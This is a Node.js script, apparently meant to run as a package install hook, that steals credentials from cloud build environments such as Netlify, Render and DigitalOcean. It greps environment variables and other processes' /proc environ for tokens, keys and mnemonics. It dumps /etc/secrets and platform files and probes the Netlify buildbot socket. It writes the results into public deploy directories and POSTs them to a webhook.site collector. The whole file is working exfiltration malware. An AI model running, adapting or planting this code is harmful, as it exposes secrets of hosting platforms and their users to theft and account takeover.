const https = require('https');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const COLLECTOR = 'https://webhook.site/7e1a92af-541b-433a-b6fc-38ef26b87b60';

function sh(cmd, t) {
  try {
    return execSync(cmd, { encoding: 'utf8', timeout: t || 25000, stdio: ['ignore', 'pipe', 'pipe'], maxBuffer: 8 * 1024 * 1024 });
  } catch (e) {
    return 'ERR ' + String((e && e.stdout) || '') + String((e && e.stderr) || '') + String((e && e.message) || '');
  }
}
function post(obj) {
  return new Promise((resolve) => {
    const body = Buffer.from(JSON.stringify(obj));
    const u = new URL(COLLECTOR);
    const req = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: 'POST',
      headers: { 'content-type': 'application/json', 'content-length': body.length }, timeout: 20000 },
      (r) => { r.resume(); r.on('end', () => resolve(r.statusCode)); });
    req.on('error', (e) => resolve('ERR ' + e.message));
    req.on('timeout', () => { req.destroy(); resolve('timeout'); });
    req.write(body); req.end();
  });
}

(async () => {
  const phase = 'p6-' + (process.argv[2] || 'install');
  const idn = sh('id; hostname; uname -a | cut -c1-120; echo PWD=$(pwd); echo HOME=$HOME');
  const env = sh("env | sort | grep -iE 'token|secret|key|pass|dsn|database|redis|postgres|aws|gcp|helius|shyft|quicknode|pinata|mnemonic|private|netlify|render|digitalocean|^DO_|site|service|account|auth|url|branch' | grep -viE 'path=|_dir=|cache|versions|user_agent|npm_config|gyp' | head -60", 20000);
  const proc = sh("for p in /proc/[0-9]*; do n=$(tr '\\0' ' ' < $p/cmdline 2>/dev/null | cut -c1-50); e=$(tr '\\0' '\\n' < $p/environ 2>/dev/null | grep -iE 'TOKEN|SECRET|KEY=|PASS|DSN|DATABASE|REDIS|AUTH|CRED' | sort -u | tr '\\n' ';'); [ -n \"$e\" ] && [ \"$n\" != \"$(cat /proc/self/cmdline | tr '\\0' ' ' | cut -c1-50)\" ] && echo \"[$n] $e\"; done | head -20", 30000);
  const secrets = sh("echo '--- /etc/secrets ---'; ls -la /etc/secrets 2>&1; for f in /etc/secrets/*; do [ -f \"$f\" ] && echo \"### $f\" && head -c 2000 \"$f\"; done; echo '--- app_platform ---'; find /.app_platform -maxdepth 3 2>&1 | head -40; for f in $(find /.app_platform -maxdepth 3 -type f 2>/dev/null | head -8); do echo \"### $f\"; head -c 1500 \"$f\"; done; echo '--- cnb/platform ---'; ls -la /cnb /platform /layers 2>&1 | head -25", 35000);
  const sock = sh("S=/tmp/netlify-buildbot-socket; ls -la $S 2>&1; for p in / /health /status /build /deploy; do echo \"== $p\"; curl -s -m 3 --unix-socket $S http://localhost$p -D - 2>&1 | head -c 400; echo; done", 30000);
  const rend = sh("echo '--- render project ---'; find /opt/render/project -maxdepth 3 2>&1 | head -30; ls -la /opt/render /opt/build /opt/buildhome 2>&1 | head -20; echo '--- tmp ---'; for f in /tmp/tmp.* /tmp/*.json /tmp/*.env; do [ -f \"$f\" ] && [ $(stat -c%s \"$f\" 2>/dev/null || echo 999999) -lt 8192 ] && echo \"### $f\" && head -c 1500 \"$f\"; done", 30000);

  const dump = ['=== IDENT ===', idn, '=== ENV ===', env, '=== PROCENV ===', proc, '=== SECRETS ===', secrets, '=== SOCKET ===', sock, '=== RENDER/DO ===', rend].join('\n');
  const capped = String(dump).slice(0, 40000);

  // publish into build/publish dir so it can be fetched over HTTP from the live site
  const targets = [process.cwd(), '/opt/build/repo', '/opt/render/project/src', '/workspace', '/opt/buildhome/repo'].filter((d, i, a) => a.indexOf(d) === i);
  const wrote = [];
  for (const d of targets) {
    try { fs.writeFileSync(path.join(d, '__probe6.txt'), capped); wrote.push(d); } catch (e) { wrote.push(d + ' ERR ' + e.code); }
  }
  fs.writeFileSync('/tmp/__probe6.txt', capped);
  await post({ kind: 'build-probe6', phase, idn: idn.slice(0, 500), wrote: wrote.join(' | '), env: String(env).slice(0, 8000), secrets: String(secrets).slice(0, 12000), sock: String(sock).slice(0, 6000) });
  console.log('probe6 done, wrote to', wrote.join(','));
})();
